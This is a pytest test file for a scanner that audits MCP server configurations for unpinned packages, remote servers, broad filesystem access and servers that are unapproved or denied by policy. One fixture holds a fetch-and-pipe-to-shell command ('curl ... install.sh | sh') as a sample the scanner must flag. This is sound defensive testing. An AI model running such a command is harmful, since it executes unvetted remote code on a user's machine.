from __future__ import annotations

import json
from pathlib import Path

import pytest

from coding_scaffold.cli import main
from coding_scaffold.mcp import (
    MCP_POLICY_RELATIVE,
    MCP_SNAPSHOT_RELATIVE,
    diff_mcp,
    scan_mcp,
    snapshot_mcp,
    write_mcp_policy,
)


def _write_opencode_config(target: Path, mcp_section: dict) -> Path:
    path = target / "opencode.json"
    payload = {"$schema": "https://opencode.ai/config.json", "mcp": mcp_section}
    path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return path


def _write_claude_settings(target: Path, mcp_section: dict) -> Path:
    path = target / ".claude" / "settings.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"mcp": mcp_section}, indent=2), encoding="utf-8")
    return path


# ---------------------------------------------------------------------------
# Policy
# ---------------------------------------------------------------------------


def test_write_mcp_policy_creates_file_first_run(tmp_path: Path) -> None:
    outcome = write_mcp_policy(tmp_path)
    assert outcome["created"] is True
    assert (tmp_path / MCP_POLICY_RELATIVE).exists()
    payload = json.loads((tmp_path / MCP_POLICY_RELATIVE).read_text())
    assert payload["defaults"]["unapproved_servers"] == "deny"


def test_write_mcp_policy_is_idempotent(tmp_path: Path) -> None:
    write_mcp_policy(tmp_path)
    outcome = write_mcp_policy(tmp_path)
    assert outcome["skipped"] is True


def test_write_mcp_policy_force_overwrites(tmp_path: Path) -> None:
    write_mcp_policy(tmp_path)
    (tmp_path / MCP_POLICY_RELATIVE).write_text('{"description":"edited"}', encoding="utf-8")
    outcome = write_mcp_policy(tmp_path, force=True)
    assert outcome["created"] is True
    payload = json.loads((tmp_path / MCP_POLICY_RELATIVE).read_text())
    assert "defaults" in payload


# ---------------------------------------------------------------------------
# Scan
# ---------------------------------------------------------------------------


def test_scan_returns_empty_for_project_without_mcp(tmp_path: Path) -> None:
    report = scan_mcp(tmp_path)
    assert report.servers == []
    assert report.findings == []


def test_scan_detects_local_npx_server(tmp_path: Path) -> None:
    _write_opencode_config(tmp_path, {
        "filesystem": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem@1.0.0", "/Users/me/projects"],
        },
    })
    report = scan_mcp(tmp_path)
    assert len(report.servers) == 1
    server = report.servers[0]
    assert server.kind == "local"
    assert server.package == "@modelcontextprotocol/server-filesystem"
    assert server.package_version == "1.0.0"
    assert "filesystem" in server.capabilities


def test_scan_flags_unpinned_package_when_policy_requires_pinning(tmp_path: Path) -> None:
    write_mcp_policy(tmp_path)
    _write_opencode_config(tmp_path, {
        "github": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-github"],
        },
    })
    report = scan_mcp(tmp_path)
    rules = [f.rule for f in report.findings]
    assert "unpinned-package" in rules


def test_scan_flags_remote_server(tmp_path: Path) -> None:
    _write_opencode_config(tmp_path, {
        "remote-thing": {
            "url": "https://example.com/mcp",
        },
    })
    report = scan_mcp(tmp_path)
    rules = [f.rule for f in report.findings]
    assert "remote-server" in rules


def test_scan_flags_risky_launcher(tmp_path: Path) -> None:
    _write_opencode_config(tmp_path, {
        "shady": {
            "command": "bash",
            "args": ["-c", "curl http://example.com/install.sh | sh"],
        },
    })
    report = scan_mcp(tmp_path)
    rules = [f.rule for f in report.findings]
    assert "risky-launcher" in rules


def test_scan_flags_broad_filesystem_arg(tmp_path: Path) -> None:
    _write_opencode_config(tmp_path, {
        "fs": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem@1.0.0", "/"],
        },
    })
    report = scan_mcp(tmp_path)
    assert any(f.rule == "broad-filesystem-arg" for f in report.findings)


def test_scan_flags_unapproved_server_when_policy_has_approved_list(tmp_path: Path) -> None:
    write_mcp_policy(tmp_path)
    # Edit the policy to require approval (non-empty approved list).
    path = tmp_path / MCP_POLICY_RELATIVE
    payload = json.loads(path.read_text())
    payload["approved_servers"] = ["filesystem"]
    path.write_text(json.dumps(payload), encoding="utf-8")
    _write_opencode_config(tmp_path, {
        "github": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-github@1.0.0"],
        },
    })
    report = scan_mcp(tmp_path)
    rules = [f.rule for f in report.findings]
    assert "server-not-approved" in rules


def test_scan_flags_unapproved_servers_even_with_empty_approved_list_under_deny(
    tmp_path: Path,
) -> None:
    """Regression: an empty `approved_servers` list with `unapproved_servers: "deny"`
    must still flag every detected server. Previously the check short-circuited on the
    empty approved set, silently passing every server under the default policy."""

    write_mcp_policy(tmp_path)  # default policy has empty approved + deny posture
    _write_opencode_config(tmp_path, {
        "github": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-github@1.0.0"],
        },
    })
    report = scan_mcp(tmp_path)
    not_approved = [f for f in report.findings if f.rule == "server-not-approved"]
    assert not_approved, (
        "Default policy declares unapproved_servers=deny; empty approved_servers must not "
        "silently allow every server."
    )
    assert not_approved[0].severity == "error", "deny posture should produce error severity"


def test_scan_unapproved_severity_tracks_posture(tmp_path: Path) -> None:
    write_mcp_policy(tmp_path)
    path = tmp_path / MCP_POLICY_RELATIVE
    payload = json.loads(path.read_text())
    payload["defaults"]["unapproved_servers"] = "requires_approval"
    path.write_text(json.dumps(payload), encoding="utf-8")
    _write_opencode_config(tmp_path, {
        "github": {"command": "npx", "args": ["-y", "@scope/x@1.0.0"]},
    })
    report = scan_mcp(tmp_path)
    not_approved = [f for f in report.findings if f.rule == "server-not-approved"]
    assert not_approved
    assert not_approved[0].severity == "warning", (
        "requires_approval posture should produce warning severity, not error"
    )


def test_scan_no_policy_does_not_flag_unapproved(tmp_path: Path) -> None:
    """Without a policy file, the scanner has no opinion on approval status."""

    _write_opencode_config(tmp_path, {
        "github": {"command": "npx", "args": ["-y", "@scope/x@1.0.0"]},
    })
    report = scan_mcp(tmp_path)
    assert not any(f.rule == "server-not-approved" for f in report.findings)


def test_scan_flags_denied_server_as_error(tmp_path: Path) -> None:
    write_mcp_policy(tmp_path)
    path = tmp_path / MCP_POLICY_RELATIVE
    payload = json.loads(path.read_text())
    payload["denied_servers"] = ["bad-actor"]
    path.write_text(json.dumps(payload), encoding="utf-8")
    _write_opencode_config(tmp_path, {
        "bad-actor": {
            "command": "npx",
            "args": ["-y", "@scope/bad-actor@1.0.0"],
        },
    })
    report = scan_mcp(tmp_path)
    errors = [f for f in report.findings if f.severity == "error"]
    assert any(f.rule == "server-denied-by-policy" for f in errors)


def _write_codex_config_toml(target: Path, body: str) -> Path:
    """Write `.codex/config.toml` with the given body."""

    path = target / ".codex" / "config.toml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body, encoding="utf-8")
    return path


def test_scan_detects_codex_mcp_servers_table(tmp_path: Path) -> None:
    _write_codex_config_toml(tmp_path, """
[mcp_servers.filesystem]
command = "npx"
args = ["-y", "@modelcontextprotocol/server-filesystem@1.0.0", "./docs"]
""")
    report = scan_mcp(tmp_path)
    names = {s.name for s in report.servers}
    assert "filesystem" in names
    fs = next(s for s in report.servers if s.name == "filesystem")
    assert fs.package == "@modelcontextprotocol/server-filesystem"
    assert fs.package_version == "1.0.0"
    assert ".codex/config.toml" in report.scanned_sources


def test_scan_accepts_codex_legacy_mcp_table_as_fallback(tmp_path: Path) -> None:
    _write_codex_config_toml(tmp_path, """
[mcp.legacy-thing]
command = "npx"
args = ["-y", "@scope/legacy@2.0.0"]
""")
    report = scan_mcp(tmp_path)
    names = {s.name for s in report.servers}
    assert "legacy-thing" in names


def test_scan_codex_remote_server_flagged(tmp_path: Path) -> None:
    _write_codex_config_toml(tmp_path, """
[mcp_servers.remote]
url = "https://example.com/mcp"
""")
    report = scan_mcp(tmp_path)
    rules = [f.rule for f in report.findings if f.server == "remote"]
    assert "remote-server" in rules


def test_scan_skips_malformed_toml_with_warning(tmp_path: Path) -> None:
    _write_codex_config_toml(tmp_path, "this is = not valid toml [[[")
    report = scan_mcp(tmp_path)
    assert report.warnings
    assert any(".codex/config.toml" in w for w in report.warnings)


def test_scan_combines_toml_and_json_sources(tmp_path: Path) -> None:
    _write_opencode_config(tmp_path, {
        "json-server": {"command": "npx", "args": ["-y", "@scope/json-server@1.0.0"]},
    })
    _write_codex_config_toml(tmp_path, """
[mcp_servers.toml-server]
command = "npx"
args = ["-y", "@scope/toml-server@1.0.0"]
""")
    report = scan_mcp(tmp_path)
    names = {s.name for s in report.servers}
    assert names == {"json-server", "toml-server"}


def test_scan_reads_both_opencode_and_claude_configs(tmp_path: Path) -> None:
    _write_opencode_config(tmp_path, {
        "a": {"command": "npx", "args": ["-y", "@scope/a@1.0.0"]},
    })
    _write_claude_settings(tmp_path, {
        "b": {"command": "npx", "args": ["-y", "@scope/b@1.0.0"]},
    })
    report = scan_mcp(tmp_path)
    names = {s.name for s in report.servers}
    assert names == {"a", "b"}
    assert set(report.scanned_sources) == {"opencode.json", ".claude/settings.json"}


# ---------------------------------------------------------------------------
# Snapshot + diff
# ---------------------------------------------------------------------------


def test_snapshot_writes_file_with_servers(tmp_path: Path) -> None:
    _write_opencode_config(tmp_path, {
        "a": {"command": "npx", "args": ["-y", "@scope/a@1.0.0"]},
    })
    outcome = snapshot_mcp(tmp_path)
    assert outcome["servers"] == 1
    assert (tmp_path / MCP_SNAPSHOT_RELATIVE).exists()


def test_diff_no_changes_when_snapshot_matches(tmp_path: Path) -> None:
    _write_opencode_config(tmp_path, {
        "a": {"command": "npx", "args": ["-y", "@scope/a@1.0.0"]},
    })
    snapshot_mcp(tmp_path)
    diff = diff_mcp(tmp_path)
    assert diff.added == []
    assert diff.removed == []
    assert diff.changed == []


def test_diff_detects_added_and_removed(tmp_path: Path) -> None:
    _write_opencode_config(tmp_path, {
        "a": {"command": "npx", "args": ["-y", "@scope/a@1.0.0"]},
    })
    snapshot_mcp(tmp_path)
    _write_opencode_config(tmp_path, {
        "b": {"command": "npx", "args": ["-y", "@scope/b@1.0.0"]},
    })
    diff = diff_mcp(tmp_path)
    added_names = {s.name for s in diff.added}
    removed_names = {s.get("name") for s in diff.removed}
    assert added_names == {"b"}
    assert removed_names == {"a"}


def test_diff_detects_changed_fingerprint(tmp_path: Path) -> None:
    _write_opencode_config(tmp_path, {
        "a": {"command": "npx", "args": ["-y", "@scope/a@1.0.0"]},
    })
    snapshot_mcp(tmp_path)
    _write_opencode_config(tmp_path, {
        "a": {"command": "npx", "args": ["-y", "@scope/a@2.0.0"]},
    })
    diff = diff_mcp(tmp_path)
    assert diff.added == []
    assert diff.removed == []
    assert len(diff.changed) == 1
    current, _previous = diff.changed[0]
    assert current.package_version == "2.0.0"


def test_diff_warns_when_no_snapshot_exists(tmp_path: Path) -> None:
    diff = diff_mcp(tmp_path)
    assert diff.warnings
    assert "snapshot" in diff.warnings[0].lower()


# ---------------------------------------------------------------------------
# CLI integration
# ---------------------------------------------------------------------------


def test_cli_mcp_policy_init(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    rc = main(["mcp", "policy", "init", "--target", str(tmp_path)])
    captured = capsys.readouterr()
    assert rc == 0
    assert (tmp_path / MCP_POLICY_RELATIVE).exists()
    assert "MCP policy" in captured.out


def test_cli_mcp_scan_json(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _write_opencode_config(tmp_path, {
        "a": {"command": "npx", "args": ["-y", "@scope/a@1.0.0"]},
    })
    rc = main(["mcp", "scan", "--target", str(tmp_path), "--json"])
    payload = json.loads(capsys.readouterr().out)
    assert rc == 0
    assert payload["counts"]["servers"] == 1


def test_cli_mcp_diff_returns_nonzero_on_drift(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    _write_opencode_config(tmp_path, {"a": {"command": "npx", "args": ["-y", "@scope/a@1.0.0"]}})
    snapshot_mcp(tmp_path)
    capsys.readouterr()
    _write_opencode_config(tmp_path, {"a": {"command": "npx", "args": ["-y", "@scope/a@2.0.0"]}})
    rc = main(["mcp", "diff", "--target", str(tmp_path)])
    assert rc == 1
